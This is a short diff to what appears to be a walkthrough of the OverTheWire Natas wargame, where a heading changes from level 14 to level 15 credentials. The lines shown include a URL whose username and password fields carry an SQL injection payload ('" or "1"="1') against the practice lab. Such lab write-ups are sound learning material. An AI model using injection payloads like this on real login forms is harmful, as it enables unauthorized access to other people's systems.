@@ -11,7 +11,7 @@
 * SQLi
 * Visit url http://natas14.natas.labs.overthewire.org/index.php?username=test%22%20or%20%221%22=%221&password=test%22%20or%20%221%22=%221&debug
 
-#### Credentials for Level 14
+#### Credentials for Level 15
 
 **Username**: *natas15*
 
